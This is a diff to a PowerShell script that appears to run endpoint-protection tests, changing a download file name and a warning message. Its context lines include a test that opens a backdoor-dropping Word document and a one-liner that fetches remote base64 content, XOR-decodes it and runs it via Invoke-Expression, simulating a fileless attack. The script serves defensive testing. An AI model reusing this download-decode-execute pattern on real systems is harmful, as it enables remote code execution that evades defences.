@@ -1172,7 +1172,7 @@ function formshtml() {
 function backdoordrop() {
     write-host -ForegroundColor white -backgroundcolor blue "`n--- 34. Document drops backdoor ---"
     write-host -foregroundcolor $processmessagecolor "Download test Word document to current directory"
-    Invoke-WebRequest -Uri https://github.com/directorcia/examples/raw/main/RS4_WinATP-Intro-Invoice.docm -OutFile .\forms.html.docx
+    Invoke-WebRequest -Uri https://github.com/directorcia/examples/raw/main/RS4_WinATP-Intro-Invoice.docm -OutFile .\RS4_WinATP-Intro-Invoice.docm
     write-host -foregroundcolor $processmessagecolor "Open document using Word"
     Start-Process winword.exe -ArgumentList ".\RS4_WinATP-Intro-Invoice.docm"
     write-host "`n1. Use the password = WDATP!diy# to open document"
@@ -1203,7 +1203,7 @@ function psfileless() {
     write-host -ForegroundColor white -backgroundcolor blue "`n--- 35. PowerShell script in fileless attack ---"
     write-host -foregroundcolor $processmessagecolor "Execute Fileless attack"
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI https://winatpmanagement.windows.com/client/management/static/WinATP-Intro-Fileless.txt -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0; $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i]; $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
-    write-host -foregroundcolor $warningmessagecolor "If NOTEPAD is executed, then the test has FAILED`n"
+    write-host -foregroundcolor $warningmessagecolor "`nIf NOTEPAD is executed, then the test has FAILED`n"
     pause
 }
 
